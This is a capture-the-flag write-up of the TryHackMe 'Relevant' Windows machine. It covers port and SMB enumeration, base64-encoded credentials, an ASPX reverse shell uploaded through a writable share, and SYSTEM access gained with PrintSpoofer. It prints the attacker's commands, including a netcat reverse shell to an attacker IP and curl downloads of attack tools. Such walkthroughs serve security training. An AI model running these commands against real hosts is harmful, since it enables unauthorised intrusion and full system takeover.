# Try Hack Me Writeup - Relevant-Windows Machine  By Mohammed-Ali Member of CyberScope
- Category: black box penetration test Level: Medium
- TryHackMe room: <https://tryhackme.com/room/relevant>

<img width="1313" height="826" alt="Screenshot_2026-05-26_08_46_40" src="https://github.com/user-attachments/assets/89abf8fb-7018-451e-8960-9e426426f4bb" />

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope
    Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
## Enumeration
### Scan Ports and Services
I used nmap to identify the open ports and service work on this port 
<img width="1920" height="1080" alt="Screenshot_2026-05-26_07_15_59" src="https://github.com/user-attachments/assets/ba4f49c0-8e69-4462-996d-9df95a4324d6" />
Result :
```python
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 
```
if you lock this machine have to web servers on port 80 and 49663
and smb 
### Enumerate SMB
i used  tool smbclient 
```python 
smbclient -L //10.113.153.158/                             
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.113.153.158 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
the profile name nt4wrksv its not defult so lets check it 
i find password.txt 
```php
smbclient  //10.113.153.158/nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls 
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5097994 blocks available
```
the Result:
```python
cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
its base64 encoded
i9 use echo to decode it 
```bash
cho "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d     
Bill - Juw4nnaM4n420696969!$$$
----------------------------------
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==                          
" | base64 -d
Bob - !P@$$W0rD!123 
```
so now itried to connect on smb server or RDP mybe this users its work on group windows 
no result important >> 
```
nxc smb 10.113.153.158  -u Bob -p '!P@$$W0rD!123'          
SMB         10.113.153.158  445    RELEVANT         [*] Windows 10 / Server 2016 Build 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True) 
SMB         10.113.153.158  445    RELEVANT         [+] Relevant\Bob:!P@$$W0rD!123 
```
the same for rdp 
so lets another try on web 
## Enumerating the webservers
Directory Fuzzing 
i used gobuster to fuzzing directory 
the Result :

<img width="998" height="993" alt="Screenshot_2026-05-26_07_42_55" src="https://github.com/user-attachments/assets/9f665667-1eff-489b-bf86-a23ff755ff54" />

now i lock for premission for profile nt4wrksv i locaked i have read and write so itried to upload file on smb 

```
smbclient //10.113.153.158/nt4wrksv                        
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put pass.txt 
putting file pass.txt as \pass.txt (0.1 kB/s) (average 0.1 kB/s)
smb: \> ls 
  .                                   D        0  Tue May 26 07:51:32 2026
  ..                                  D        0  Tue May 26 07:51:32 2026
  pass.txt                            A       49  Tue May 26 07:51:32 2026
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5098005 blocks available
```
yes it work so now itried to read this file from web mayber its work 
yeh on web open on port  49663
i can read it 
```
curl http://10.113.153.158/nt4wrksv/pass.txt
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ curl http://10.113.153.158:49663/nt4wrksv/pass.txt         
Bob - !P@$$W0rD!123Bill - Juw4nnaM4n420696969!$$$
```
so now i tried to upload reverse shell aspx 
```
 curl http://10.113.153.158:49663/nt4wrksv/shell.aspx
and use nc licener 
rlwrap nc -lnvp 1234                               
listening on [any] 1234 ...
connect to [192.168.128.80] from (UNKNOWN) [10.113.153.158] 50029
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```
## Privileges escalation
```
c:\windows\system32\inetsrv>whoami /priv 
whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\windows\system32\inetsrv>
```
its SeImpersonatePrivilege its enable this was very dengere so lets explit it 
i use print spofer from 
```
https://github.com/itm4n/PrintSpoofer/releases
```
and i opened pythonserver and get the print spoofer 
```python
curl  http://192.168.128.80:1235/PrintSpoofer64.exe -o Spoofer64.exe
PS C:\Users\Public> ls 
ls 


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---        7/25/2020  10:55 AM                Documents                     
d-r---        7/16/2016   6:23 AM                Downloads                     
d-----        5/26/2026   5:23 AM                Microsoft                     
d-r---        7/16/2016   6:23 AM                Music                         
d-r---        7/16/2016   6:23 AM                Pictures                      
d-r---        7/16/2016   6:23 AM                Videos                        
-a----        5/26/2026   5:25 AM          27136 Spoofer64.exe
```
<img width="1920" height="1080" alt="Screenshot_2026-05-26_08_35_14" src="https://github.com/user-attachments/assets/a9495788-a485-4bff-8afd-264e10d50d8b" />

i used the 
```python
Spoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
```
but you need to download the nc.exe from 
```
https://github.com/int0x33/nc.exe/blob/master/nc.exe
and the same things 
curl http://192.168.128.80:1235/nc.exe -o nc.exe
```
make licener use nc -lnvp 1337 and run the Spoofer.exe -c "c:\Temp\nc.exe [ip] 1337 -e cmd"

<img width="1920" height="1080" alt="Screenshot_2026-05-26_08_39_50" src="https://github.com/user-attachments/assets/177f1178-3364-47e8-8c98-bff4d9ae371e" />

```
whoami
whoami
nt authority\system
```
to know the permission 
```
whoami /priv
```
finsish :
```python
C:\Users\Bob\Desktop>dir 
dir 
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\Users\Bob\Desktop

07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  19,929,763,840 bytes free

C:\Users\Bob\Desktop>more user.txt
________________________________
C:\Users\Administrator\Desktop>dir 
dir 
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\Users\Administrator\Desktop

07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  19,938,762,752 bytes free

C:\Users\Administrator\Desktop>more root.txt
```

